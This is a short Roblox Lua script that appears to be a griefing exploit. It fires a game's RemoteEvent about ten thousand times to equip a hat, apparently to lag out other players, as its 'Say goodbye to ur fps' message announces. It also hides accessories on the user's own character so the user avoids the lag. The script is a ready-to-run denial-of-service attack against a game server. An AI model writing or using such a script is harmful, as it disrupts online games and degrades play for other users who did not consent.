if _G.hat == nil then
    print("no hat found")
    return
end
print("Say goodbye to ur fps")

-- client anti-lag
game.Players.LocalPlayer.Character.DescendantAdded:Connect(function(v)
    if v.Name == "Handle" and v.Parent.ClassName == "Accessory" then
        v.Transparency = 1
    end
end)

coroutine.resume(coroutine.create(function()
    for _=1, 10 do
        wait(2)
        print("Total parts: ", #game.Players.LocalPlayer.Character:GetChildren())
    end
end))

for _=0, 10000 do
	game:GetService("ReplicatedStorage").RemoteEvent:FireServer("Equip", _G.hat, "Hats")
end